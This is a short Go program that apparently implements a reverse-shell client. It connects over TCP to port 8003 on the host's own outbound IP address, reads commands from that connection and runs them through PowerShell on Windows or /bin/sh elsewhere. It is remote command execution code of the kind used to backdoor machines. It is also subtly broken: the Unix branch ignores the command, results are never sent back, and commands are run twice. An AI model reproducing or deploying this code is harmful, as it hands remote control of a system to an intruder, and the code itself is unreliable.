package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"sync"
)

var wg sync.WaitGroup

func main() {
	conn, _ := net.Dial("tcp", GetOutboundIP()+":8003")
	var cmd *exec.Cmd
	reader := bufio.NewReader(conn)
	for {
		command, _ := reader.ReadString('\n')
		if runtime.GOOS == "windows" {
			cmd = exec.Command("powershell.exe", command)
		} else {
			cmd = exec.Command("/bin/sh")
		}
		out, _ := cmd.Output()
		fmt.Println(string(out))
		// conn.Write(out)
		cmd.Run()
		//Set input/output to the established connection's in/out
	}
}

func runCommand(cmd *exec.Cmd) {
	cmd.Run()
}

func GetOutboundIP() string {
	//Dial a connection to a WAN IP to get the box's correct IP address.
	//Note that this doesn't actually establish a connection,
	//but simply pretends to setup one. This is enough to get us the IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}
